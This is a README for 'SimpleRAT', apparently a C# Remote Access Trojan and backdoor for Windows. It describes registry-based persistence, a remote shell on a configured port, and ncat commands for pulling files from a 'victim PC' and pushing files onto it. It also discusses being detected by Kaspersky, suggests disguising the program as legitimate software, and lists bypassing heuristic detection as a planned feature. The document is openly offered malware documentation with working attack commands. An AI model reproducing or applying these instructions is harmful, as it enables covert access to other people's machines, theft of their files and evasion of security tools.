# SimpleRAT

Self-contained Remote-Access-Trojan/Backdoor written fully in C#.
After installation and launch, listens on port specified in JSON configuration. After successfull connection gives remote shell.
Configured for self-startup (key in registry)
Developed for Windows, Fully compatible with Netcat (tested with windows version). 
NO additional server setups for file downloads or uploads
NO additional dll's or configuration files 
Only one .exe and netcat on your side.

# What RAT can
1. After connection on specified port (provided in JSON file, which can be changed as you wish and should be merged into exe after that by using provided tool), gives reverse shell.
2. Is able to download any files from victim's PC on specified port (provided in JSON file) and upload files on victim PC, no need for server setup or anything, only netcat on your side and launched RAT on victim's side :)
### How to download files:
1. Put netcat on listening state (ncat -v -l -p "port for file download from JSON" > "file name with extension that you want to download")

Example: ncat -v -l -p 8889 > helloworld2.exe

NOTE: I advice you to use "-v" for more verbose output

2. Connect to victim PC through netcat (ncat <ip addrress> <port from JSON configuration on which RAT will be listening>)

Example: ncat 192.168.88.220 8888

3. Check if reverse shell is working (cd, dir)

5. Currently RAT has it's own command interpreter which will listen to commands from your PC, these type of commands begin with "RAT".

For file download command is - "RAT download file -p <windows/path/to/file/withextension>"
  
Process:
![RAT-guide](https://user-images.githubusercontent.com/53906830/109512165-1aee9280-7aa4-11eb-891f-89ff993b7dd4.png)

### How to upload files:
1. Connect to victim PC through netcat (ncat <ip addrress> <port from JSON configuration on which RAT will be listening>)

Example: ncat 192.168.88.220 8888

2. Check if reverse shell is working (cd, dir)

3. Put RAT in listenning state by executing:
RAT upload file -p <path/to/file.exe>

Example: RAT upload file -p C:\Users\someuser\checkme\ConsoleApp4.exe

4. Send file through netcat on main port of your RAT

Example: ncat 192.168.88.230 8888 --send-only < ConsoleApp4.exe

Process:
![rat-upload](https://user-images.githubusercontent.com/53906830/110226904-37029180-7ef3-11eb-897b-8c7db2e9a581.png)

## Downsides
1. Is detected by Kasperky (Heuristic) on full protection as Trojan.Win32.Generic
2. High .exe application size (35 MB) 
3. High memory usage

![rat-memory](https://user-images.githubusercontent.com/53906830/110226932-73ce8880-7ef3-11eb-9f0e-b455832e95b4.png)

Both size and memory problems are because RAT is self-contained application with builded-in .NET runtime.
From one side those are problems for sure, from other side you could mask program with such size and memory usage as other legitimate one :)

### Features To Be Done: 

1. Automatic ports opening required for communication;
2. RAT as Windows Service (?)
3. Bypass heuristic (?)
